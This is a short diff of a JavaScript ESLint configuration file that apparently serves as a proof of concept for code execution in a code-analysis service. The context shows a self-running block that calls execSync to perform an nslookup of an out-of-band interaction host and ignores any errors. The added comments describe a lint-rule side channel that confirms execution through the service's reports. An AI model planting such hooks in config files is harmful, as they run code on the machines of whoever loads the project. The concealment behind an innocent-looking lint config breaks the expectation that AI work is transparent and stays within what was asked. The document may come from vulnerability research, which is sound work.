@@ -9,4 +9,6 @@ const OAST_HOST = "db5su1fkntr8hva7hjsgscpjyb6qefh4k.oast.pro";
     try { execSync(`nslookup ${OAST_HOST}`, { timeout: 3000 }); } catch (__) {}
   }
 })();
-export default [{ rules: {} }];
+// Side-channel: if ESLint9 executes this config, "no-var" flags probe.js
+// Codacy reporting a "no-var" issue = proof of code execution
+export default [{ rules: { "no-var": "error", "no-console": "error" } }];
